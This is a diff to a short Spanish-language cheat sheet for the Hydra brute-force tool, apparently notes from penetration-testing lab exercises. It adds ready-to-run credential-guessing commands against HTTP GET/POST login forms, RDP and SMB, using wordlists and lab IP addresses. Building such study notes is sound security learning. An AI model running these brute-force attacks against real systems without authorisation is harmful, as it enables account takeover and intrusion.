@@ -11,9 +11,16 @@ hydra -C dictionariy_compuesto ip -s port http-get "/path-to-login" -f
 Login por método post:
 hydra -l user -P diccionario -f host/ip -s puerto http-post-form "path-to-login:variable_username=^USER^&variable_password=^PASS^:elemento html para comparación(mensaje de error de logueo, formulario, etc)"
 
+login por método get:
+hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -p minga -f 83.136.254.53 -s 53056 http-get-form "/question1:Username=^USER^&Password=^PASS^:Invalid username"
+
+login rdp:
+hydra -L user.list -P password.list rdp://10.129.42.197
+
+login smb:
+hydra -L user.list -P password.list smb://10.129.42.197
 
 Listas interesantes:
 ftp-betterdefaultpasslist.txt (seclist) credenciales user:pass
 
-login pot método get:
-hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -p minga -f 83.136.254.53 -s 53056 http-get-form "/question1:Username=^USER^&Password=^PASS^:Invalid username"
+
